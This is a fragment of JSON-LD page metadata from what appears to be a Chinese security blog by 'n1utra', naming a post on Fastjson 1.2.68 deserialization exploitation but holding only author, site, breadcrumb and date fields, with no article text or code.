name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","description":"网络安全","inLanguage":"zh","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"n1utra's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"网络安全"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"n1utra's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/08/07/FastJson-1-2-68及之前利用/","name":"浅述Fastjson(3)：FastJson 1.2.68及之前利用"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"n1utra's blog","url":"http://example.com/","keywords":null,"description":"网络安全","author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"网络安全"},"publisher":{"@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"浅述Fastjson(3)：FastJson 1.2.68及之前利用","description":"网络安全","inLanguage":"zh","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/"},"author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"n1utra's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/","wordCount":0,"datePublished":"2025-08-07T13:37:25.000Z","dateModified":"2025-08-07T15:30:21.613Z","keywords":"JAVA安全,FastJson反序列化","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
